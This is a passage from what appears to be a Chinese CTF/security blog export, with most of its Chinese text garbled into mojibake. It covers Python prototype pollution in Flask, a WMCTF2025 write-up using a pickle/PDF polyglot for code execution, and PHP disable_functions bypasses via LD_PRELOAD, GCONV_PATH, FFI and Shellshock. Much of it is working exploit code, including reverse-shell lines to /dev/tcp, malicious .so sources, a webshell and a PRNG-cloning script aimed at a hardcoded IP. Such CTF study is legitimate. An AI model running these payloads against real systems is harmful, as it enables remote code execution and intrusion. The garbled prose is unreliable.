è½½ï¼Œå…¶åœ¨importlibè¿™ä¸€å†…ç½®æ¨¡å—ä¸­æœ‰å…·ä½“å®ç°ã€‚è€Œimportlibæ¨¡å—ä¸‹æ‰€æœ‰çš„pyæ–‡ä»¶ä¸­å‡å¼•å…¥äº†sysæ¨¡å—ã€‚ __spec__ï¼ŒåŒ…å«äº†å…³äºç±»åŠ è½½æ—¶å€™çš„ä¿¡æ¯ã€‚æ‰€ä»¥å¯ä»¥ç›´æ¥é‡‡ç”¨æ¨¡å—å.__spec__.__init__.__globals__[sys]è·å–åˆ°sysæ¨¡å— å‡½æ•°å½¢å‚é»˜è®¤å€¼æ›¿æ¢ï¼šå…³é”®ä¿¡æ¯æ›¿æ¢ï¼šsecret_keysecret_keyæ˜¯åœ¨å½“å‰å…¥å£æ–‡ä»¶ä¸‹é¢çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡__init__.__globals__è·å–å…¨å±€å˜é‡ from flask import Flask,requestimport jsonapp = Flask(__name__)def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, __getitem__): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)class cls(): def __init__(self): passinstance = cls()@app.route(/,methods=[POST, GET])def index(): if request.data: merge(json.loads(request.data), instance) return [+]Config:%s%(app.config[SECRET_KEY])app.run(host=0.0.0.0) __init__ : __globals__ : app : config : SECRET_KEY :Polluted~ _got_first_requestï¼špayload= __init__: __globals__: app: _got_first_request:False _static_url_path:å½“pythonæŒ‡å®šäº†staticé™æ€ç›®å½•ä»¥åï¼Œæˆ‘ä»¬å†è¿›è¡Œè®¿é—®å°±ä¼šå®šå‘åˆ°staticæ–‡ä»¶å¤¹ä¸‹é¢çš„å¯¹åº”æ–‡ä»¶è€Œä¸ä¼šå­˜åœ¨ç›®å½•ç©¿æ¢­çš„æ¼æ´ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬æƒ³è¦è®¿é—®å…¶ä»–æ–‡ä»¶ä¸‹é¢çš„æ•æ„Ÿä¿¡æ¯ï¼Œæˆ‘ä»¬å°±éœ€è¦æ±¡æŸ“è¿™ä¸ªé™æ€ç›®å½•ï¼Œè®©ä»–è‡ªåŠ¨å¸®æˆ‘ä»¬å®ç°å®šå‘ payload= __init__: __globals__: app: _static_folder:./ os.path.pardir:payload= __init__: __globals__: os: path: pardir:, Jinjaè¯­æ³•æ ‡è¯†ç¬¦ï¼š __init__ : __globals__ : app : jinja_env :variable_start_string : [[,variable_end_string:]] ç–‘é—®ä½†æ˜¯æˆ‘å¾ˆå¥‡æ€ªå°±æ˜¯å¼€å‘è€…åœ¨å¼€å‘çš„æ—¶å€™ä¸ºä»€ä¹ˆä¼šç”¨åˆ°mergeè¿™ç©æ„ï¼Œæ„Ÿè§‰ç”¨å¤„å¹¶ä¸æ˜¯å¾ˆå¤§å•Šã€‚ä½†æ˜¯éƒ½å­¦äº†ï¼Œå°±åœ¨ç°æœ‰å±‚é¢å­¦å§ï¼Œå¦‚æœä½ çŸ¥é“æ¬¢è¿åŠ æˆ‘çš„è”ç³»æ–¹å¼è”ç³»æˆ‘ï¼ å‚è€ƒæ–‡ç« https://xz.aliyun.com/news/12518https://rycarl.cn/index.php/2025/04/28/python%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e4%bb%8e%e5%9f%ba%e7%a1%80%e5%88%b0%e6%b7%b1%e5%85%a5/https://j1rry-learn.github.io/posts/ctf-%E9%A2%98%E5%9E%8B-python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-%E9%A2%98%E8%AE%B0%E5%92%8C%E6%80%BB%E7%BB%93-/","tags":["CTFå­¦ä¹ "]},{"title":"WMCTF2025-WEB WP","path":"/2025/09/22/WMCTF2025/","content":"pdf2textpdfè½¬txtçš„å·¥å…· æºç å®¡äº†å®¡ æ²¡å‘ç°ä¸œè¥¿ ç»™äº†hint pickle.loads åœ¨pdfminerè¿™ä¸ªåº“ æ‰¾åˆ°å”¯ä¸€ä¸€ä¸ªpickle.loadsçš„ç‚¹ class CMapDB: _cmap_cache: Dict[str, PyCMap] = _umap_cache: Dict[str, List[PyUnicodeMap]] = class CMapNotFound(CMapError): pass @classmethod def _load_data(cls, name: str) - Any: name = name.replace(\\0, ) filename = %s.pickle.gz % name log.debug(loading: %r, name) cmap_paths = ( os.environ.get(CMAP_PATH, /usr/share/pdfminer/), os.path.join(os.path.dirname(__file__), cmap), ) for directory in cmap_paths: path = os.path.join(directory, filename) if os.path.exists(path): gzfile = gzip.open(path) try: return type(str(name), (), pickle.loads(gzfile.read())) finally: gzfile.close() raise CMapDB.CMapNotFound(name) è¿™æ®µä»£ç çš„ä½œç”¨æ˜¯CMapDB æ˜¯ä¸€ä¸ªç®¡ç† CMapï¼ˆå­—ç¬¦æ˜ å°„è¡¨ï¼‰å’Œ UnicodeMapï¼ˆUnicode æ˜ å°„è¡¨ï¼‰ç¼“å­˜çš„æ•°æ®åº“ç±»ã€‚_load_data æ–¹æ³•ç”¨äºæ ¹æ®æ˜ å°„è¡¨åç§° nameï¼ŒæŸ¥æ‰¾å¹¶åŠ è½½å¯¹åº”çš„ CMap æ•°æ®æ–‡ä»¶ï¼ˆå¦‚ cmap/ ç›®å½•ä¸‹çš„ pickle.gz æ–‡ä»¶ï¼‰ï¼Œå¹¶å°†å…¶ååºåˆ—åŒ–ä¸º Python å¯¹è±¡ã€‚å¦‚æœæ‰¾ä¸åˆ°å¯¹åº”çš„æ–‡ä»¶ï¼Œåˆ™æŠ›å‡º CMapNotFound å¼‚å¸¸ã€‚ä»£ç è§£é‡Šï¼šname.replace(\\0, )ï¼šå»é™¤åç§°ä¸­çš„ç©ºå­—ç¬¦ï¼Œé˜²æ­¢å¼‚å¸¸ã€‚filename = %s.pickle.gz % nameï¼šæ‹¼æ¥å‡ºè¦æŸ¥æ‰¾çš„æ–‡ä»¶åã€‚cmap_pathsï¼šå®šä¹‰äº†ä¸¤ä¸ªæŸ¥æ‰¾è·¯å¾„ï¼Œä¼˜å…ˆä½¿ç”¨ç¯å¢ƒå˜é‡ CMAP_PATHï¼Œå¦åˆ™ç”¨å½“å‰æ¨¡å—ä¸‹çš„ cmap ç›®å½•ã€‚éå† cmap_pathsï¼Œæ¯ä¸ªç›®å½•ä¸‹æŸ¥æ‰¾ filename æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶å­˜åœ¨ï¼Œä½¿ç”¨ gzip æ‰“å¼€å¹¶è¯»å–å†…å®¹ï¼Œç„¶åç”¨ pickle ååºåˆ—åŒ–ä¸º Python å¯¹è±¡ï¼Œå¹¶ç”¨ type åˆ›å»ºä¸€ä¸ªåŠ¨æ€ç±»å‹å¯¹è±¡ï¼ˆåå­—ä¸º nameï¼Œå†…å®¹ä¸ºè§£åŒ…åçš„å­—å…¸ï¼‰ã€‚å¦‚æœæ‰€æœ‰è·¯å¾„éƒ½æ‰¾ä¸åˆ°æ–‡ä»¶ï¼Œåˆ™æŠ›å‡º CMapNotFound å¼‚å¸¸ã€‚ç®€è€Œè¨€ä¹‹ï¼Œè¿™æ®µä»£ç çš„ä½œç”¨æ˜¯ï¼šæ ¹æ® CMap åç§°ï¼Œè‡ªåŠ¨æŸ¥æ‰¾å¹¶åŠ è½½ PDF å­—ç¬¦æ˜ å°„è¡¨æ•°æ®ï¼Œä¸ºåç»­ PDF è§£æå’Œå­—ç¬¦è½¬æ¢æä¾›æ”¯æŒã€‚ é‚£ä¹ˆè¿™ä¸ªé¢˜çš„æ¼æ´ç‚¹åœ¨å“ªå‘¢ å°±æ˜¯æˆ‘ä»¬è¦è¦†ç›–nameå­—ç¬¦é›† æ¥åŠ è½½æ¶æ„çš„å­—ç¬¦é›†è®©ä»–pickleååºåˆ—åŒ–ä»è€Œè¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„ç›®æ ‡ é‚£ä¹ˆé—®é¢˜æ¥äº† æ€ä¹ˆè¦†ç›–è¿™ä¸ªå­—ç¬¦é›†æ–‡ä»¶å‘¢? é—®aiä»–è¯´ é‚£ä¹ˆå°±æ˜¯åœ¨pdfæ–‡ä»¶é‡Œçš„ Encoding æŒ‡å®šæˆ‘ä»¬ä¸Šä¼ çš„æ¶æ„å­—ç¬¦é›†å°±å¯ä»¥äº† æœ€åä¼šé€šè¿‡os.path.joinç›´æ¥åŠ è½½è¿™ä¸ªæ–‡ä»¶ é‚£ä¹ˆç°åœ¨çš„æ€è·¯éå¸¸æ˜ç¡®äº† 1.å…ˆä¸Šä¼ è¿™ä¸ªæ¶æ„çš„å­—ç¬¦é›†æ–‡ä»¶ è¿™ä¸ªæ–‡ä»¶éœ€è¦æ»¡è¶³ç»•è¿‡å¯¹pdfçš„æ£€æŸ¥å¹¶ä¸”å¯ä»¥æˆåŠŸè¢«gzipè§£å‹ 2.å†ä¸Šä¼ pdfåŠ è½½è¿™ä¸ªæ¶æ„å­—ç¬¦é›†æ–‡ä»¶ä»è€Œè§¦å‘æˆ‘ä»¬çš„æ¶æ„å‘½ä»¤ ç»è¿‡æˆ‘çš„æµ‹è¯• å½“ä½ æ˜æ–‡ä¸ºè¿™ä¸ªçš„æ—¶å€™å¯ä»¥ç»•è¿‡å¯¹pdfçš„æ£€æµ‹ å¿…é¡»æ¢è¡Œ trailer/Root 1xref æˆ‘ä»¬å¯ä»¥ä½¿ç”¨opcodeæˆ–è€…pickleç›´æ¥çš„æ•°æ®ä¹Ÿæ˜¯å¯ä»¥çš„ import gzipimport zlibimport requestspdf = b(S\\trailer/Root 1xref\\def opcode(): a = (Sbash -c bash -i /dev/tcp/ip/2333 01iossystem. return a.encode()cmap_file = sauy122.pickle.gzwith gzip.open(cmap_file, wb) as f: f.write(opcode())comp = zlib.compressobj(level=0, method=zlib.DEFLATED, wbits=31)gz_bytes = comp.compress(pdf) + comp.flush()with open(cmap_file, ab) as f: f.write(gz_bytes)url = http://ip/requests.post(url + /upload,files=file: open(cmap_file, rb)) ä¸Šä¼ æˆåŠŸå ç›‘å¬ç«¯å£å°±å¾—åˆ° PDFæ–‡ä»¶ %PDF-1.41 0 obj/Type /Catalog/Pages 2 0 Rendobj2 0 obj/Type /Pages/Kids [3 0 R]/Count 1endobj3 0 obj/Type /Page/Parent 2 0 R/MediaBox [0 0 612 792]/Resources /Font /F1 4 0 R/Contents 5 0 Rendobj4 0 obj/Type /Font/Subtype /Type0/BaseFont /HeiseiMin-W3/Encoding /#2Fapp#2Fuploads#2Fsauy122/DescendantFonts [6 0 R]endobj5 0 obj/Length 60streamBT/F1 12 Tf100 700 Td(Chinese Test) Tj0 -20 Td(Attack PDF) TjETendstreamendobj6 0 obj/Type /Font/Subtype /CIDFontType0/BaseFont /HeiseiMin-W3/CIDSystemInfo /Registry (Adobe)/Ordering (Japan1)/Supplement 0endobjxref0 70000000000 65535 f 0000000009 00000 n 0000000058 00000 n 0000000115 00000 n 0000000251 00000 n 0000000369 00000 n 0000000489 00000 n trailer/Size 7/Root 1 0 Rstartxref%%EOF gzæ–‡ä»¶ç»•è¿‡pdfæ£€æµ‹è¿˜æœ‰ä¸€ç§åšæ³• æ¥æºäºscå¼ºå¼ºå¼ºï¼ æŠŠpickleæ•°æ®gzipå‹ä¸€ä¸‹ï¼Œç„¶å 010editor æŠŠé‡Œé¢è¡¨ç¤ºæ–‡ä»¶åé‚£ä¸€æ®µæ›¿æ¢æˆ odfåŸæ–‡ guessè¿›å»å°±æ˜¯ä¸‰ä¸ªè·¯ç”± æ³¨å†Œå’Œç™»å½•è·¯ç”± è¿˜æœ‰ä¸€ä¸ªapi é‚£ä¹ˆapiæ˜¯å½“æˆ‘ä»¬ä¼ å…¥çš„ä½œä¸ºkey1ç­‰äºæˆ‘ä»¬éšæœºæ•°key2çš„æ—¶å€™ å¯ä»¥æŠŠæˆ‘ä»¬çš„payloadä½œä¸ºeval(payload, __builtin__:)æ‰§è¡Œå‘½ä»¤ é‚£ä¹ˆå…ˆçœ‹ def generate_random_string(): return str(rd.getrandbits(32)) æŠŠè¿™æ®µç›´æ¥æ‰”æµè§ˆå™¨æœç´¢å‡ºæ¥ç¬¬ä¸€ç¯‡æ–‡ç« å°±æ˜¯https://www.cnblogs.com/wandervogel/p/16805983.html MT19937ä¼ªéšæœºæ•°ç®—æ³• mt19937çš„éšæœºæ•°ç”Ÿæˆå™¨ç»“æ„é¦–å…ˆéœ€è¦ä¸€ä¸ªuint32çš„ç§å­ï¼Œç„¶åç”Ÿæˆä¸€ä¸ªå…·æœ‰624ä¸ªuint32æ•°ç»„çš„çŠ¶æ€æ•°ç»„ã€‚ç”ŸæˆçŠ¶æ€æ•°ç»„ä¹‹åï¼Œè¿›è¡Œä¸€æ¬¡æ—‹è½¬ï¼Œæœ€ç»ˆå¯ä»¥è¾“å‡º624ä¸ªéšæœºçš„uint32ã€‚ç„¶åé‡å¤æ‰§è¡Œæ—‹è½¬æ“ä½œã€‚ æ–‡ç« é‡Œä¹Ÿå†™äº† æˆ‘ä»¬æŠŠ624ä¸ªéšæœºæ•°å¾—åˆ°å°±å¯ä»¥é¢„æµ‹æ¥ä¸‹æ¥çš„éšæœºæ•° äºæ˜¯å†™ä¸€ä¸ªè„šæœ¬ import requestsfrom random import Random# ---------- MT19937 tempering åè½¬ ----------def invert_right(m, l, val=): length = 32 mx = 0xffffffff if val == : val = mx i, res = 0, 0 while i * l length: mask = (mx (length - l) mx) (i * l) tmp = m mask m = m ^ (tmp l val) res += tmp i += 1 return resdef invert_left(m, l, val): length = 32 mx = 0xffffffff i, res = 0, 0 while i * l length: mask = (mx (length - l) mx) (i * l) tmp = m mask m ^= tmp l val res |= tmp i += 1 return resdef invert_temper(m): m = invert_right(m, 18) m = invert_left(m, 15, 4022730752) m = invert_left(m, 7, 2636928640) m = invert_right(m, 11) return mdef clone_mt(record): state = [invert_temper(i) for i in record] gen = Random() gen.setstate((3, tuple(state + [0]), None)) return gen# ---------- ä»æ¥å£æ”¶é›†éšæœºæ•° ----------prng = []api_url = http://47.109.207.123:11451/apiwhile len(prng) 624: r = requests.post(api_url, json=key:122) num = int(r.json()[message].split(:)[1]) prng.append(num) print(len(prng), num) # æ‰“å°æ”¶é›†è¿›åº¦# ---------- å…‹éš† MT å¹¶é¢„æµ‹å 20 ä¸ªéšæœºæ•° ----------g = clone_mt(prng)for _ in range(624): g.getrandbits(32) # æ¶ˆè€—å‰ 624 ä¸ªæ•°å­—ï¼Œè®©çŠ¶æ€åŒæ­¥print(Next 20 predicted random numbers:)for _ in range(20): print(g.getrandbits(32)) ç„¶åå°±æ˜¯æ‰§è¡Œå‘½ä»¤ key:3384741307,payload:__import__(os).system(mkdir /app/static cat /flag /app/static/flag.txt) è¿™æ ·å°±è¡Œ","tags":["CTF-wp"]},{"title":"Bypass disablefunction","path":"/2025/09/01/bypass-disablefunction/","content":"disable_functionç»•è¿‡é¶åœºhttps://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions é‡Œé¢è®°å½•äº†éƒ¨åˆ†çš„ç»•è¿‡ å¯ä»¥è‡ªå·±ä½¿ç”¨dockerèµ·ç¯å¢ƒå¤ç° æ‰§è¡Œå‘½ä»¤è¿”å›ret=127 è¿™ä¸ªæ˜¯shellè¿”å›çš„ä¸€ä¸ªæ ‡å‡†æ‰§è¡Œç  127ä»£è¡¨å‘½ä»¤æ²¡æœ‰è¢«æ‰¾åˆ° ç»•è¿‡æ–¹æ³•LD_PRELOAD ç¯å¢ƒå˜é‡LD_PRELOAD æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ç¯å¢ƒå˜é‡ï¼Œç”¨æ¥å‘Šè¯‰åŠ¨æ€é“¾æ¥å™¨åœ¨åŠ è½½ç¨‹åºæ—¶ï¼Œä¼˜å…ˆåŠ è½½ä½ æŒ‡å®šçš„å…±äº«åº“ï¼ˆ.so æ–‡ä»¶ï¼‰Linuxæ“ä½œç³»ç»Ÿçš„åŠ¨æ€é“¾æ¥åº“åœ¨åŠ è½½è¿‡ç¨‹ä¸­ï¼ŒåŠ¨æ€é“¾æ¥å™¨ä¼šå…ˆè¯»å–LD_PRELOADç¯å¢ƒå˜é‡å’Œé»˜è®¤é…ç½®æ–‡ä»¶/etc/ld.so.preloadï¼Œå¹¶å°†è¯»å–åˆ°çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶è¿›è¡Œé¢„åŠ è½½ã€‚å³ä½¿ç¨‹åºä¸ä¾èµ–è¿™äº›åŠ¨æ€é“¾æ¥åº“ï¼ŒLD_PRELOADç¯å¢ƒå˜é‡å’Œ/etc/ld.so.preloadé…ç½®æ–‡ä»¶ä¸­æŒ‡å®šçš„åŠ¨æ€é“¾æ¥åº“ä¾ç„¶ä¼šè¢«åŠ è½½ï¼Œå› ä¸ºå®ƒä»¬çš„ä¼˜å…ˆçº§æ¯”LD_LIBRARY_PATHç¯å¢ƒå˜é‡æ‰€å®šä¹‰çš„é“¾æ¥åº“æŸ¥æ‰¾è·¯å¾„çš„æ–‡ä»¶ä¼˜å…ˆçº§è¦é«˜ï¼Œæ‰€ä»¥èƒ½å¤Ÿæå‰äºç”¨æˆ·è°ƒç”¨çš„åŠ¨æ€åº“è½½å…¥ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œld-linux.soåŠ è½½åŠ¨æ€é“¾æ¥åº“çš„é¡ºåºä¸ºï¼šLD_PRELOAD LD_LIBRARY_PATH /etc/ld.so.cache /lib /usr/lib åˆçº§ æœ‰sendmailé€šè¿‡putenv()å‡½æ•°å°†LD_PRELOADè®¾ç½®ä¸ºæŒ‡å®šæ¶æ„åŠ¨æ€é“¾æ¥åº“(.so)æ–‡ä»¶è·¯å¾„ï¼Œåˆ©ç”¨å…¶åŠ è½½ä¼˜å…ˆçº§é«˜åŠ«æŒä»»æ„å‡½æ•°æ‰§è¡Œçš„å†…å®¹ï¼Œä»è€Œè¾¾åˆ°ä¸è°ƒç”¨ PHP çš„å„ç§å‘½ä»¤æ‰§è¡Œå‡½æ•°ä»å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ç›®çš„ã€‚è¿™æ—¶å€™éœ€è¦ä¸€ä¸ªä¸åœ¨disable_functionså†…çš„PHPå‡½æ•°ï¼Œåˆèƒ½åœ¨è°ƒç”¨æ—¶è¿è¡Œç³»ç»Ÿå¯æ‰§è¡Œç¨‹åºã€‚ æ”»å‡»æ€è·¯ï¼š åˆ›å»ºä¸€ä¸ª.soæ–‡ä»¶,linuxçš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ä½¿ç”¨putenvå‡½æ•°å°†LD_PRELOADè·¯å¾„è®¾ç½®ä¸ºæˆ‘ä»¬è‡ªå·±åˆ›å»ºçš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶åˆ©ç”¨æŸä¸ªå‡½æ•°å»è§¦å‘è¯¥åŠ¨æ€é“¾æ¥åº“ è¿™é‡Œä½¿ç”¨mail()å‡½æ•°è¿›è¡Œæµ‹è¯•ï¼š ä½¿ç”¨readelf -Ws /usr/sbin/sendmail å¯ä»¥æŸ¥çœ‹ sendmail å‘½ä»¤å¯èƒ½è°ƒç”¨çš„åº“å‡½æ•° strace -få¯æŸ¥çœ‹å…·ä½“æ‰§è¡Œè¿‡ç¨‹ä¸­è°ƒç”¨çš„å‡½æ•°ï¼Œè¿™é‡Œæ‹¿ geteuid() å‡½æ•°ä¸ºä¾‹ æˆ‘ä»¬è¿™é‡Œä½¿ç”¨getuidå‡½æ•°,ç›®æ ‡æ˜¯åŠ«æŒè¯¥å‡½æ•°: #include stdlib.h#include stdio.h#include string.hvoid payload() system(whoami /var/tmp/flag.txt);int geteuid() if (getenv(LD_PRELOAD) == NULL) return 0; unsetenv(LD_PRELOAD); payload(); ç¼–è¯‘æˆsoæ–‡ä»¶ gcc -c -fPIC test.c -o testgcc -shared test -o test.so å†æ¬¡æ–°å»ºä¸€ä¸ªshell.phpæ–‡ä»¶å†™æˆ ?phpputenv(LD_PRELOAD=/var/www/test.so);mail(,,,,);? æŠŠè¿™ä¸ªæ–‡ä»¶ä¸Šä¼ åˆ°æœ‰æƒé™ä¸Šä¼ çš„ç›®å½•å½“ä¸­ ä¾‹é¢˜:[æå®¢å¤§æŒ‘æˆ˜]RCE MEè¿™é¢˜å‰ç½®ä¸è¯´äº†æœ€ä¸»è¦æ˜¯è½è„šåˆ°disablefunctionçš„ç»•è¿‡ å› ä¸ºè¿™é“é¢˜ç½‘ç«™æ ¹ç›®å½•æ²¡ä¸Šä¼ æ–‡ä»¶çš„æƒé™ æˆ‘ä»¬æ”¹åˆ°vartmpç›®å½•ä¸Šä¼  ä½†æ˜¯æˆ‘ä»¬å¿…é¡»è¦è®¿é—®è¿™ä¸ªshell.php è¿™æ ·æˆ‘ä»¬çš„soæ–‡ä»¶æ‰èƒ½å¤Ÿç”Ÿæ•ˆ äºæ˜¯å¼‚æˆ–å–åå†™$_GET[_]($_GET[_]); è¿›è¡Œæ–‡ä»¶åŒ…å«å°±å¥½äº† ç„¶åè¿›antswordåˆ·æ–° å°±å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„flag.txt ?code=$%fe%fe%fe%fe^%a1%b9%bb%aa[_]($%fe%fe%fe%fe^%a1%b9%bb%aa[__]);_=assert__=include(/var/tmp/shell.php) shell.phpå’Œtest.cçš„æ–‡ä»¶å†…å®¹ ?phpputenv(LD_PRELOAD=/var/tmp/test.so);mail(,,,,);? #include stdlib.h#include stdio.h#include string.hvoid payload() system(/readflag /var/tmp/flag.txt);int geteuid() if (getenv(LD_PRELOAD) == NULL) return 0; unsetenv(LD_PRELOAD); payload(); è¿›é˜¶ æ— sendmailä½¿ç”¨ä¸‰ä¸ªé‡è¦æ–‡ä»¶ é¡¹ç›®åœ°å€ https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD.git bypass_disablefunc.php,bypass_disablefunc_x64.soæˆ–bypass_disablefunc_x86.so,bypass_disablefunc.cå°† bypass_disablefunc.php å’Œ bypass_disablefunc_x64.soä¼ åˆ°ç›®æ ‡æœ‰æƒé™çš„ç›®å½•ä¸­ é‚£ä¹ˆè¿™å‡ ä¸ªæ–‡ä»¶çš„åŸç† ä½ çœ‹cæºç å°±å¯ä»¥çŸ¥é“ #define _GNU_SOURCE#include stdlib.h#include stdio.h#include string.hextern char** environ;__attribute__ ((__constructor__)) void preload (void) // get command line options and arg const char* cmdline = getenv(EVIL_CMDLINE); // unset environment variable LD_PRELOAD. // unsetenv(LD_PRELOAD) no effect on some // distribution (e.g., centos), I need crafty trick. int i; for (i = 0; environ[i]; ++i) if (strstr(environ[i], LD_PRELOAD)) environ[i][0] = \\0; // executive command system(cmdline); æœ€é‡è¦çš„æ˜¯__attribute__((constructor)),ä»–æ˜¯GCCçš„ä¸€ä¸ªCè¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦ã€‚å¯ä»¥è®©ç”±å®ƒä¿®é¥°çš„å‡½æ•°åœ¨ main() ä¹‹å‰æ‰§è¡Œï¼Œè‹¥å®ƒå‡ºç°åœ¨å…±äº«å¯¹è±¡ä¸­æ—¶ï¼Œé‚£ä¹ˆä¸€æ—¦å…±äº«å¯¹è±¡è¢«ç³»ç»ŸåŠ è½½ï¼Œç«‹å³å°†æ‰§è¡Œ __attribute__((constructor)) ä¿®é¥°çš„å‡½æ•° è¿˜æ˜¯ä½¿ç”¨rce meè¿™é“ä¾‹é¢˜ ç„¶åä½¿ç”¨poc å› ä¸ºæˆ‘è¿™é“æ˜¯å› ä¸ºç½‘ç«™æ ¹ç›®å½•æƒé™ åªèƒ½ä¸Šä¼ åˆ°å…¶ä»–æœ‰æƒé™çš„ç›®å½•ç„¶åä½¿ç”¨æ–‡ä»¶åŒ…å« ?code=$%fe%fe%fe%fe^%a1%b9%bb%aa[_]($%fe%fe%fe%fe^%a1%b9%bb%aa[__]);_=assert__=include(/var/tmp/bypass_disablefunc.php)cmd=/readflagoutpath=/tmp/tmpfilesopath=/var/tmp/bypass_disablefunc_x64.so è¿™æ ·å°±å¯ä»¥æˆåŠŸæ‹¿åˆ°flag GCONV_PATH ç¯å¢ƒå˜é‡åˆ©ç”¨æ¡ä»¶ Linux æ“ä½œç³»ç»Ÿ putenv iconv å­˜åœ¨å¯å†™çš„ç›®å½•, éœ€è¦ä¸Šä¼  .so æ–‡ä»¶ æ”»å‡»æ€è·¯ï¼š å¯ä»¥ä½¿ç”¨antswordçš„æ’ä»¶ https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/ æ”»å‡»åŸç†ï¼š linuxç³»ç»Ÿæä¾›äº†ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼šGCONV_PATHï¼Œè¯¥ç¯å¢ƒå˜é‡èƒ½å¤Ÿä½¿glibcä½¿ç”¨ç”¨æˆ·è‡ªå®šä¹‰çš„ gconv-modules æ–‡ä»¶ã€‚gconv-modules æ–‡ä»¶ä¸­åŒ…å«äº†å„ä¸ªå­—ç¬¦é›†çš„ç›¸å…³ä¿¡æ¯å­˜å‚¨çš„è·¯å¾„ï¼Œæ¯ä¸ªå­—ç¬¦é›†çš„ç›¸å…³ä¿¡æ¯å­˜å‚¨åœ¨ä¸€ä¸ª.soæ–‡ä»¶ä¸­ï¼Œå³ gconv-modules æ–‡ä»¶æä¾›äº†å„ä¸ªå­—ç¬¦é›†çš„ .so æ–‡ä»¶æ‰€åœ¨ä½ç½®ã€‚php çš„ iconv å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å­—ç¬¦é›†çš„åå­—ï¼Œè¿™ä¸ªå‚æ•°ä¼šä¼ é€’åˆ° glibc çš„ iconv_open å‡½æ•°çš„å‚æ•°ä¸­ã€‚iconv_open å‡½æ•°ä¾ç…§GCONV_PATHæ‰¾åˆ° gconv-modules æ–‡ä»¶ã€‚æ¥ç€æ ¹æ® gconv-modules æ–‡ä»¶çš„æŒ‡ç¤ºæ‰¾åˆ°å‚æ•°å¯¹åº”çš„ .so æ–‡ä»¶ã€‚ç„¶åè°ƒç”¨ .so æ–‡ä»¶ä¸­çš„ gconv() å’Œ gconv_init() å‡½æ•°ã€‚è¿™é‡Œå°±å¯ä»¥åŠ«æŒå‡½æ•°æ‰§è¡Œä»»æ„å‘½ä»¤äº† #include stdio.h #include stdlib.h void gconv() void gconv_init() system(bash -c bash -i /dev/tcp/ip/23333 01); ç¼–è¯‘æˆsoæ–‡ä»¶ ç„¶åphpæ–‡ä»¶æ˜¯ ?php putenv(GCONV_PATH=/tmp); iconv(payload, UTF-8, whatever);? or ?php putenv(GCONV_PATH=/tmp/); include(php://filter/read=convert.iconv.exp.utf-8/resource=/tmp/exp.so);? PHP7.4 FFIä½¿ç”¨æ¡ä»¶ï¼š 1.PHP 7.4 2.å¼€å¯äº† FFI æ‰©å±•ä¸”ffi.enable=true æ¦‚å¿µï¼š FFIï¼ˆForeign Function Interfaceï¼‰ï¼Œå³å¤–éƒ¨å‡½æ•°æ¥å£ï¼Œå…è®¸ä»ç”¨æˆ·åŒºè°ƒç”¨Cä»£ç ã€‚ç®€å•åœ°è¯´ï¼Œå°±æ˜¯ä¸€é¡¹è®©ä½ åœ¨PHPé‡Œèƒ½å¤Ÿè°ƒç”¨Cä»£ç çš„æŠ€æœ¯ã€‚ æ¼æ´æˆå› ï¼š å½“PHPæ‰€æœ‰çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°è¢«ç¦ç”¨åï¼Œé€šè¿‡PHP 7.4çš„æ–°ç‰¹æ€§FFIå¯ä»¥å®ç°ç”¨PHPä»£ç è°ƒç”¨Cä»£ç çš„æ–¹å¼ï¼Œå…ˆå£°æ˜Cä¸­çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œç„¶åå†é€šè¿‡FFIå˜é‡è°ƒç”¨è¯¥Cå‡½æ•°å³å¯Bypass disable_functionsã€‚ æ”»å‡»ä»£ç  ?php$cmd=$_GET[cmd];$ffi = FFI::cdef(int system(const char *command););$ffi-system($cmd /tmp/sauy);echo file_get_contents(/tmp/sauy);@unlink(/tmp/SD);? è¿™æ ·å°±å¯ä»¥ç»•è¿‡ æ¥æ‰§è¡Œå‘½ä»¤ Bash Shellshockè€çˆ·æ´ äº†è§£ä¸‹ (CVE-2014-6271)ç ´å£³æ¼æ´ ä½¿ç”¨æ¡ä»¶: 1.php 5.6.2 2.bash 4.3ï¼ˆç ´å£³ï¼‰ æ¼æ´æˆå› ï¼š Bashä½¿ç”¨çš„ç¯å¢ƒå˜é‡æ˜¯é€šè¿‡å‡½æ•°åç§°æ¥è°ƒç”¨çš„ï¼Œå¯¼è‡´æ¼æ´å‡ºé—®é¢˜æ˜¯ä»¥â€œ()â€å¼€å¤´å®šä¹‰çš„ç¯å¢ƒå˜é‡åœ¨å‘½ä»¤ENVä¸­è§£ææˆå‡½æ•°åï¼ŒBashæ‰§è¡Œå¹¶æœªé€€å‡ºï¼Œè€Œæ˜¯ç»§ç»­è§£æå¹¶æ‰§è¡Œshellå‘½ä»¤ã€‚è€Œå…¶æ ¸å¿ƒçš„åŸå› åœ¨äºåœ¨è¾“å…¥çš„è¿‡æ»¤ä¸­æ²¡æœ‰ä¸¥æ ¼é™åˆ¶è¾¹ç•Œï¼Œä¹Ÿæ²¡æœ‰åšå‡ºåˆæ³•åŒ–çš„å‚æ•°åˆ¤æ–­ ?php # Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) # Google Dork: none # Date: 10/31/2014 # Exploit Author: Ryan 